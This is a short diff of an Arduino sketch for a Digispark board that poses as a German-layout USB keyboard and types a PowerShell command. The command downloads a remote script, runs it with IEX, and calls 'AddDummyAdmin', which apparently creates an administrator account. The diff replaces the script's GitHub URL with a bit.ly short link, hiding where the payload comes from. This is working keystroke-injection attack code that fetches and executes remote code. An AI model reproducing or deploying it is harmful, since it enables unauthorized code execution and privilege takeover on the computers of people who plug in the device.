@@ -29,7 +29,7 @@ void setup()
   DigiKeyboardDe.delay(1000);
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER); 
   DigiKeyboardDe.delay(500);  
-  DigiKeyboardDe.println("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/deftooth.ps1');AddDummyAdmin");
+  DigiKeyboardDe.println("IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/37wVYXd');AddDummyAdmin");
 }
 
 void loop() 
